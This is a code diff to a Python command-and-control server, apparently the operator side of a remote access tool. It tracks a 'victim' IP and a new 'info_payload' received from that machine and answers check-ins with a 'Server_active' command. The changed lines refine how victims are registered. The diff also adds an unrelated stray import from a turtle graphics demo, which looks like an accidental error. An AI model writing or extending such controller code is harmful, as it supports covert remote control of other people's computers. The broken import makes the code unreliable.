@@ -11,6 +11,7 @@ The controller runs a listener in a separate thread and allows user input to con
 import socket, os
 import json
 import threading
+from turtledemo.penrose import inflatedart
 from typing import Optional
 import time
 # import keyboard
@@ -98,6 +99,7 @@ class ControllerServer:
         self.running = True
         self.buffer = ""
         self.info_victim = ""
+        self.info_payload: dict = {}
 
     def send_command(self, message: str, timeout: float = 2.0):
 
@@ -177,13 +179,13 @@ class ControllerServer:
                     data_str = data.get("message", "")
                     signal = data.get("signal", False)
                     ip_victim = data.get("from_ip", None)
+                    info_payload = data.get("info_payload", {})
 
-                    if (self.ip_victim is None
-                            or self.ip_victim != ip_victim
-                            or self.info_victim == data_str):
+                    if (self.ip_victim != ip_victim
+                            or self.info_payload != info_payload):
                         self.ip_victim = ip_victim
+                        self.info_payload = info_payload
                         self.send_command(message="Server_active")
-                        self.info_victim = data_str
                         continue
 
                     if signal:
